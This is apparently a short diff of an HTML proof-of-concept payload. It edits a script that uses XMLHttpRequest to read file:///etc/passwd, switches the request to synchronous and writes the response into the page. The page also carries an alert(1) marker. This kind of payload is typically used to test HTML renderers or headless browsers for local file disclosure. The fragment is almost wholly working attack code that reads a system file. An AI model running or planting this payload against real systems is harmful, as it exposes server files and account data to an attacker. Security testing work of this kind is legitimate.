@@ -9,8 +9,9 @@ alert(1);
 x.onload=function(){
 document.write(this.responseText)
 };
-x.open("GET","file:///etc/passwd");
+x.open("GET","file:///etc/passwd",false);
 x.send();
+document.write(x.responseText);
 </script>
 
 </body></html>
